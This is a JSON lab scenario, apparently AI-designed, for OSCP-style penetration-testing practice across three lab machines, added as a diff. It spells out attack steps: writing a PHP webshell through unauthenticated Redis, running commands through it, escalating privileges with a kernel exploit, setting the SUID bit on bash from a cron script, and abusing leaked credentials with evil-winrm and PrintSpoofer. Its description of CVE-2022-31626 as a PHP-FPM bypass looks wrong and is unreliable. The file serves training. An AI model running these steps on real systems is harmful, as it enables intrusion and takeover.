@@ -1,0 +1,123 @@
+{
+  "id": "the-patched-box",
+  "title": "The Patched Box",
+  "category": "edge-case",
+  "source": ["AI-designed"],
+  "designed_by": "ai-composite",
+  "description": "Obvious CVE exists but is patched. Must find the non-obvious second vulnerability. 3 machines, 1 network, 1 Windows, 2 Linux.",
+  "introduction": "This scenario trains you to avoid rabbit holes: when the obvious exploit fails, pivot to alternative attack surfaces. Critical for OSCP where time is limited.",
+  "mental_model": "Version-check first; if patched, enumerate all services and ports. The real vuln is often on a different port or in config files.",
+  "key_principles": [
+    "Verify CVE applicability before spending time",
+    "Full port scan: secondary vuln often on different port",
+    "Redis unauth: write webshell to web dir if writable",
+    "Check web.config.bak, backup shares for creds",
+    "PHP-FPM bypass: different Apache version on 8080"
+  ],
+
+  "indicators": {
+    "difficulty": 7,
+    "cognitive_load": 6,
+    "enumeration_depth": 7,
+    "rabbit_hole_risk": 9,
+    "time_pressure": 6
+  },
+
+  "mitre": {
+    "tactics": ["TA0001", "TA0003", "TA0004", "TA0006"],
+    "techniques": [
+      {"id": "T1190", "name": "Exploit Public-Facing Application"},
+      {"id": "T1552.001", "name": "Credentials In Files"},
+      {"id": "T1068", "name": "Exploitation for Privilege Escalation"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon", "T2-Web-Access", "T3-NonWeb-Access", "T4a-Linux-PrivEsc", "T4b-Win-PrivEsc"],
+
+  "environment": {
+    "machine_count": 3,
+    "network_count": 1,
+    "os_distribution": {"windows": 1, "linux": 2},
+    "has_ad": false,
+    "has_pivoting": false,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "patched", "cve", "alternative-exploit",
+    "version-check", "rabbit-hole"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": false,
+    "pen200_modules": [6, 12, 16, 17],
+    "pattern_frequency": "low",
+    "recommended_order": 21
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "10.10.70.0/24", "label": "External"}
+  ],
+
+  "machines": [
+    {
+      "id": "patch-lin1",
+      "label": "PATCH-LIN1",
+      "ip": "10.10.70.10",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 80, "name": "HTTP", "version": "Apache 2.4.52", "vulnerabilities": [{"type": "patched", "summary": "CVE-2021-41773 patched in 2.4.52", "leads_to": "dead-end"}], "commands": []},
+        {"port": 8080, "name": "HTTP", "version": "PHP 8.1.0", "vulnerabilities": [{"type": "rce", "cve": "CVE-2022-31626", "summary": "PHP-FPM bypass - different vuln", "leads_to": "www-data"}], "commands": ["searchsploit php 8.1", {"cmd": "python3 php_fpm_exploit.py 10.10.70.10 8080", "rationale": "Why: Apache patched; PHP 8.1 on 8080 has different CVE"}]},
+        {"port": 22, "name": "SSH", "version": "", "vulnerabilities": [{"type": "auth", "summary": "SSH with creds from config", "leads_to": "local-user"}], "commands": []}
+      ],
+      "privesc": [{"from": "www-data", "to": "root", "technique": "Kernel exploit (CVE-2021-3493)", "commands": ["uname -a", "searchsploit ubuntu 20.04", "gcc exploit.c -o exploit", "./exploit"]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "patch-lin2",
+      "label": "PATCH-LIN2",
+      "ip": "10.10.70.11",
+      "os": "Linux",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 22, "name": "SSH", "version": "OpenSSH 8.9", "vulnerabilities": [{"type": "patched", "summary": "CVE-2020-15778 patched", "leads_to": "dead-end"}], "commands": []},
+        {"port": 6379, "name": "Redis", "version": "", "vulnerabilities": [{"type": "unauth", "summary": "Redis no auth - secondary vuln", "leads_to": "redis"}], "commands": ["redis-cli -h 10.10.70.11", "config set dir /var/www/html", "config set dbfilename shell.php", "set test '<?php system($_GET[\"c\"]); ?>'", "save"]},
+        {"port": 80, "name": "HTTP", "version": "", "vulnerabilities": [{"type": "rce", "summary": "Webshell from Redis", "leads_to": "www-data"}], "commands": ["curl http://10.10.70.11/shell.php?c=id"]}
+      ],
+      "privesc": [{"from": "www-data", "to": "root", "technique": "Cron + writable script", "commands": ["linpeas.sh", "cat /etc/crontab", "echo 'chmod u+s /bin/bash' >> /opt/backup.sh"]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "patch-win",
+      "label": "PATCH-WIN",
+      "ip": "10.10.70.12",
+      "os": "Windows",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 445, "name": "SMB", "version": "", "vulnerabilities": [{"type": "patched", "summary": "EternalBlue patched", "leads_to": "dead-end"}], "commands": []},
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "auth", "summary": "WinRM with creds from backup share", "leads_to": "local-user"}], "commands": ["smbclient -N //10.10.70.12/Backup", "get config.xml", "evil-winrm -i 10.10.70.12 -u admin -p '<from-config>'"]},
+        {"port": 80, "name": "HTTP", "version": "IIS", "vulnerabilities": [{"type": "auth", "summary": "Web config backup.old", "leads_to": "creds"}], "commands": [{"cmd": "curl http://10.10.70.12/web.config.bak", "rationale": "Why: Backup config files often expose secrets"}, "grep -i password web.config.bak"]}
+      ],
+      "privesc": [{"from": "admin", "to": "SYSTEM", "technique": "PrintSpoofer", "commands": ["PrintSpoofer64.exe -i -c cmd"]}],
+      "credentials": [{"user": "admin", "type": "password", "source": "web.config.bak or Backup share config.xml", "unlocks": ["winrm"]}],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [],
+
+  "attack_paths": [
+    {"id": "path-patch-lin1", "name": "PATCH-LIN1: PHP-FPM not Apache", "color": "#6bb8cc", "steps": ["patch-lin1"], "description": "Apache CVE patched → PHP 8.1 CVE-2022-31626 on 8080"},
+    {"id": "path-patch-lin2", "name": "PATCH-LIN2: Redis not SSH", "color": "#e8a87c", "steps": ["patch-lin2"], "description": "SSH CVE patched → Redis unauth → webshell"},
+    {"id": "path-patch-win", "name": "PATCH-WIN: Config not EternalBlue", "color": "#85e89d", "steps": ["patch-win"], "description": "EternalBlue patched → web.config.bak / Backup share → WinRM"}
+  ]
+}
